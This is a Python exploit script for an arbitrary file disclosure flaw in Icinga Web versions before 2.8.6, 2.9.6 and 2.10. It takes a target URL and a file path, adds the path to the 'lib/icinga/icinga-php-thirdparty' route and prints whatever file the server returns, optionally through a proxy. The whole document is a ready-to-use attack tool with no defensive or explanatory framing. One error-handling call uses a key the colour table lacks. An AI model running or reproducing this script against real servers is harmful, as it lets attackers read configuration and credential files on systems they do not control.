import argparse
import requests
from colored import colored


def print_message(message, type):
    color = {
        "SUCCESS": "green",
        "INFO": "blue",
        "WARNING": "red",
        "ALERT": "red",
        "ERROR": "red",
    }
    print(f"[{colored(type, color[type])}] {message}")


def get_normalized_url(url):
    if not url.endswith("/"):
        url += "/"
    if not url.startswith("http://") and not url.startswith("https://"):
        url = "http://" + url
    return url


def get_proxy_protocol(url):
    if url.startswith("https://"):
        return "https"
    return "http"


def main():
    parser = argparse.ArgumentParser(description="Arbitrary File Disclosure Vulnerability in Icinga Web <2.8.6, <2.9.6, <2.10")
    parser.add_argument("TARGET", type=str, help="Target Icinga location")
    parser.add_argument("FILE", type=str, help="Filename to gather from exploit")
    parser.add_argument("-p", "--proxy", type=str, help="HTTP proxy address")
    args = parser.parse_args()

    if args.proxy:
        proxy_url = get_normalized_url(args.proxy)
        proxy_protocol = get_proxy_protocol(proxy_url)
        proxies = {proxy_protocol: proxy_url}
    else:
        proxies = {}

    base_url = get_normalized_url(args.TARGET)
    exploit_url = base_url + "lib/icinga/icinga-php-thirdparty" + args.FILE

    request = requests.get(base_url, proxies=proxies)
    if request.status_code == 404:
        print_message("Connect failed to this URL", "Error")
        exit()

    request = requests.get(exploit_url, proxies=proxies)
    file_content = request.text

    print(file_content)


if __name__ == "__main__":
    main()
